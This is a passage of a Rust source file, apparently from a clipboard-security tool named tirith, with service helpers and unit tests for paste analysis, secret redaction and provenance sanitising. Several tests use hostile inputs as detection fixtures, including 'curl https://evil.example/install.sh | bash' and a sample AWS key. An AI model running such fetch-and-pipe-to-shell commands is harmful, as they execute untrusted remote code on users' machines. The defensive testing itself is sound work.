            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        false
    }
}

/// Unload the service unit. `true` when the unload command reported success.
fn unload_service() -> bool {
    #[cfg(target_os = "macos")]
    {
        let path = match service_unit_path() {
            Some(p) => p,
            None => return false,
        };
        std::process::Command::new("launchctl")
            .args(["unload", "-w"])
            .arg(&path)
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "disable", "--now", "tirith-clipboard.service"])
            .status();
        true
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        false
    }
}

/// Best-effort "is this service running" probe. Never fails the CLI on a
/// launchctl/systemctl absence, and suppresses the probe's stderr so `guard status`
/// stays quiet when the service simply isn't installed.
fn is_service_loaded() -> bool {
    use std::process::Stdio;
    #[cfg(target_os = "macos")]
    {
        // `launchctl list <Label>`: 0 found, 113 not-found.
        std::process::Command::new("launchctl")
            .args(["list", "sh.tirith.clipboard"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        std::process::Command::new("systemctl")
            .args(["--user", "is-active", "tirith-clipboard.service"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        let _ = Stdio::null;
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::test_harness::{EnvGuard, ENV_LOCK};
    use tirith_core::verdict::Action;

    /// Regression (CodeRabbit Major): `copy()` analyzes a LOCAL FILE, so it must pass
    /// `AbsentOrInvalid` to forbid the engine reading `clipboard_source.json` — else a
    /// hash-match would fire `PasteSourceMismatch`. Plants a matching sidecar and proves
    /// `AbsentOrInvalid` suppresses the finding while `Unread` (positive control) fires it.
    #[test]
    fn copy_path_does_not_consult_sidecar() {
        use tirith_core::clipboard::{content_sha256_hex, ClipboardSourceState};
        use tirith_core::verdict::RuleId;

        // Mutates process-wide `XDG_STATE_HOME`; hold the shared `ENV_LOCK` so it can't
        // race a sibling that sets `HOME`/`XDG_*` under a different mutex.
        let _lock = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        // Pipes to a shell (reaches tier 3) with a destination host differing from the
        // recorded source host — the shape that fires `PasteSourceMismatch` if consulted.
        let input = "curl https://evil.example/install.sh | bash";
        let content_sha256 = content_sha256_hex(input.as_bytes());

        // Isolate `state_dir()` under a temp `XDG_STATE_HOME`; plant a matching record.
        let dir = tempfile::tempdir().unwrap();
        let state_dir = dir.path().join("state");
        let tirith_state = state_dir.join("tirith");
        std::fs::create_dir_all(&tirith_state).unwrap();
        let record_json = format!(
            r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
        );
        std::fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();

        let _state = EnvGuard::set("XDG_STATE_HOME", &state_dir);

        // Copy path passes `AbsentOrInvalid`; positive control reuses the record via `Unread`.
        let absent = analyze_as_paste(input, ClipboardSourceState::AbsentOrInvalid);
        let unread = analyze_as_paste(input, ClipboardSourceState::Unread);

        // Copy path (`AbsentOrInvalid`): no mismatch finding despite a matching record on disk.
        assert!(
            !absent
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
            "copy path (AbsentOrInvalid) must NOT consult the sidecar; PasteSourceMismatch fired anyway: {:?}",
            absent
                .findings
                .iter()
                .map(|f| format!("{}: {}", f.rule_id, f.title))
                .collect::<Vec<_>>(),
        );

        // `Unread` control: the mismatch fires, proving the record is matchable and that
        // the `clipboard_source` parameter is what suppresses it above.
        assert!(
            unread
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
            "Unread control must consult the planted sidecar and fire PasteSourceMismatch; got: {:?}",
            unread
                .findings
                .iter()
                .map(|f| format!("{}: {}", f.rule_id, f.title))
                .collect::<Vec<_>>(),
        );
    }

    #[test]
    fn analyze_as_paste_flags_aws_key() {
        let v = analyze_as_paste(
            "export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n",
            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        );
        assert!(
            v.findings.iter().any(|f| f.severity >= Severity::High),
            "expected a High-severity AWS-key finding, got: {:?}",
            v.findings
                .iter()
                .map(|f| (f.rule_id.to_string(), f.severity))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn analyze_as_paste_allows_plain_text() {
        let v = analyze_as_paste(
            "hello world\nthis is just a note\n",
            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        );
        assert!(
            v.action == Action::Allow,
            "expected Allow for plain text, got: {:?}",
            v.action
        );
    }

    #[test]
    fn clipboard_display_bounding_does_not_mutate_raw_audit_verdict() {
        let findings = (0..(tirith_core::verdict::MAX_PRESENTED_FINDINGS + 20))
            .map(|index| tirith_core::verdict::Finding {
                rule_id: tirith_core::verdict::RuleId::CredentialInText,
                severity: tirith_core::verdict::Severity::High,
                title: format!("secret {index}"),
                description: "raw forensic finding".to_string(),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            })
            .collect::<Vec<_>>();
        let raw = tirith_core::verdict::Verdict::from_findings(
            findings,
            3,
            tirith_core::verdict::Timings::default(),
        );
        let raw_count = raw.findings.len();
        let display = clipboard_display_verdict(&raw, &[]);

        assert_eq!(raw.findings.len(), raw_count);
        assert_eq!(
            display.findings.len(),
            tirith_core::verdict::MAX_PRESENTED_FINDINGS
        );
        assert!(display.findings.iter().any(|finding| {
            finding.rule_id == tirith_core::verdict::RuleId::AnalysisIncomplete
                && finding.title == "Additional findings omitted from presentation"
        }));
    }

    #[test]
    fn redact_override_refuses_non_secret_blocking_content() {
        let input = "curl https://example.com/install.sh | bash";
        let verdict = prepare_redacted_copy(input, ShareAudience::Generic, &[])
            .expect_err("credential redaction must not waive a pipe-to-shell verdict");
        assert!(has_blocking_findings(&verdict.verdict));
    }

    #[test]
    fn redact_override_allows_content_after_secret_is_removed() {
        let key = "AKIAIOSFODNN7EXAMPLE";
        let (redacted, summary) = prepare_redacted_copy(
            &format!("AWS_ACCESS_KEY_ID={key}"),
            ShareAudience::Generic,
            &[],
        )
        .unwrap_or_else(|_| panic!("a fully removed credential should be safe to copy"));
        assert!(!redacted.contains(key));
        assert!(summary.contains("aws_access_key"), "got: {summary}");
    }

    #[test]
    fn watch_json_and_human_provenance_share_frozen_dlp_and_bounds() {
        let canary = "C02_WATCH_CUSTOM_CANARY";
        let provider_token = "provider-path-token-0123456789";
        let built_in = "AKIAIOSFODNN7EXAMPLE";
        let patterns = vec![regex::escape(canary)];
        let compiled = tirith_core::redact::CompiledCustomPatterns::new_silent(&patterns);
        let record = tirith_core::clipboard::ClipboardSourceRecord {
            updated_at: "2026-08-09T00:00:00Z".to_string(),
            content_sha256: "0".repeat(64),
            source_url: format!(
                "https://user:password@mainnet.infura.io/v3/{provider_token}?token={built_in}#fragment"
            ),
            source_title: format!(
                "title {canary} {built_in}\u{1b}[31m\n{}",
                "oversize ".repeat(tirith_core::verdict::MAX_PRESENTATION_BYTES)
            ),
            hidden_text_detected: true,
        };

        let json = watch_source_json(&record, &compiled);
        let serialized = serde_json::to_vec(&json).unwrap();
        assert!(serialized.len() <= tirith_core::verdict::MAX_PRESENTATION_BYTES);
        let serialized_text = String::from_utf8(serialized).unwrap();
        for secret in [canary, provider_token, built_in, "user:password"] {
            assert!(!serialized_text.contains(secret), "JSON leaked {secret}");
        }
        assert!(serialized_text.contains("[REDACTED:custom]"));
        assert!(!serialized_text.contains("\\u001b"));
        assert!(!json["source_title"].as_str().unwrap().contains('\n'));
        assert!(
            json["source_title"].as_str().unwrap().chars().count()
                <= crate::cli::PROVENANCE_MAX_CHARS + 1
        );

        let mut human = Vec::new();
        write_watch_source_human(&mut human, &record, &compiled).unwrap();
        assert!(human.len() <= tirith_core::verdict::MAX_PRESENTATION_BYTES);
        let human = String::from_utf8(human).unwrap();
        for secret in [canary, provider_token, built_in, "user:password"] {
            assert!(!human.contains(secret), "human output leaked {secret}");
        }
        assert!(human.contains("[REDACTED:custom]"));
        assert!(!human.contains('\u{1b}'));
        assert_eq!(
            human.lines().count(),
            1,
            "untrusted newline escaped: {human:?}"
        );
        assert!(human.contains("[hidden text detected]"));

        let hostile_path = PathBuf::from(format!(
            "/tmp/{canary}/{built_in}\u{1b}[2J\n{}",
            "p".repeat(tirith_core::verdict::MAX_PRESENTATION_BYTES)
        ));
        let start_json = watch_start_json(&hostile_path, &compiled);
        let start_serialized = serde_json::to_vec(&start_json).unwrap();
        assert!(start_serialized.len() <= tirith_core::verdict::MAX_PRESENTATION_BYTES);
        let start_text = String::from_utf8(start_serialized).unwrap();
        assert!(!start_text.contains(canary));
        assert!(!start_text.contains(built_in));
        assert!(!start_text.contains("\\u001b"));
        assert!(start_text.contains("[REDACTED:custom]"));

        let mut start_human = Vec::new();
        write_watch_start_human(&mut start_human, &hostile_path, &compiled).unwrap();
        assert!(start_human.len() <= tirith_core::verdict::MAX_PRESENTATION_BYTES);
        let start_human = String::from_utf8(start_human).unwrap();
        assert!(!start_human.contains(canary));
        assert!(!start_human.contains(built_in));
        assert!(!start_human.contains('\u{1b}'));
        assert!(start_human.contains("[REDACTED:custom]"));
        assert_eq!(start_human.lines().count(), 1);
    }

    #[test]
    fn watch_discovery_is_injected_once_and_uses_remote_replacement_dlp() {
        let calls = std::cell::Cell::new(0usize);
        let canary = "C02_REMOTE_REPLACEMENT_CANARY";
        let compiled = discover_watch_dlp_with(|| {
            calls.set(calls.get() + 1);
            let mut policy = tirith_core::policy::Policy::default();
            policy.scope = tirith_core::policy::PolicyScope::Remote;
            policy.dlp_custom_patterns = vec![regex::escape(canary)];
            policy
        });

        let sanitized = crate::cli::sanitize_provenance_text_with_compiled(
            &format!("remote title {canary}"),
            &compiled,
        );

        assert_eq!(
            calls.get(),
            1,
            "watch policy discovery must run exactly once"
        );
        assert!(!sanitized.contains(canary));
        assert!(sanitized.contains("[REDACTED:custom]"));
    }

    /// `render_service_unit` returns a non-empty payload on supported platforms.
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    #[test]
    fn render_service_unit_emits_nonempty_payload() {
        let s = render_service_unit().expect("supported platform should render unit");
        assert!(!s.is_empty());
    }

    /// macOS unit carries the launchd Label.
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_service_unit_includes_label() {
        let s = render_service_unit().expect("macos should render unit");
        assert!(s.contains("sh.tirith.clipboard"));
        assert!(s.contains("clipboard"));
        assert!(s.contains("daemon"));
        assert!(s.contains("--foreground"));
    }

    /// Linux unit references `graphical-session.target` so it doesn't start in tty-only sessions.
    #[cfg(target_os = "linux")]
    #[test]
    fn linux_service_unit_targets_graphical_session() {
        let s = render_service_unit().expect("linux should render unit");
        assert!(s.contains("graphical-session.target"));
        assert!(s.contains("ExecStart="));
        assert!(s.contains("clipboard daemon --foreground"));
    }

    /// macOS unit logs to `~/Library/Logs/`, not world-writable `/tmp` (Code-reviewer #6:
    /// a foreign symlink in `/tmp` could redirect the daemon's logs).
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_service_unit_logs_to_user_library() {
        let s = render_service_unit().expect("macos should render unit");
        assert!(
            !s.contains("/tmp/tirith-clipboard"),
            "must not log to world-writable /tmp; got: {s}"
        );
        assert!(
            s.contains("Library/Logs/sh.tirith.clipboard"),
            "should log to ~/Library/Logs; got: {s}"
        );
    }

    /// Idempotency: writing the same unit content twice is a no-op on the
    /// second pass (compares file content, not just existence).
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    #[test]
    fn install_service_idempotency_matches_content() {
        // Mirror the `needs_write` predicate used by `install_service`.
        let unit_content = render_service_unit().expect("unit");
        let tmp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(tmp.path(), &unit_content).unwrap();
        let needs_write_first = !matches!(
            std::fs::read_to_string(tmp.path()),
            Ok(existing) if existing == unit_content
        );
        assert!(!needs_write_first, "matching content must skip the write");

        // Mismatched content → needs_write flips back to true.
        std::fs::write(tmp.path(), b"different content").unwrap();
        let needs_write_second = !matches!(
            std::fs::read_to_string(tmp.path()),
            Ok(existing) if existing == unit_content
        );
        assert!(
            needs_write_second,
            "mismatched content must trigger the write"
        );
    }

    /// `sha256_hex` is a stable 64-char lowercase-hex digest (the debounce key relies on it).
    #[test]
    fn sha256_hex_is_stable_64_lowercase_hex() {
        let h = sha256_hex(b"hello");
        assert_eq!(h.len(), 64);
        assert!(h
            .chars()
            .all(|c| c.is_ascii_hexdigit() && !c.is_uppercase()));
        assert_eq!(h, sha256_hex(b"hello"));
        assert_ne!(h, sha256_hex(b"world"));
    }
}
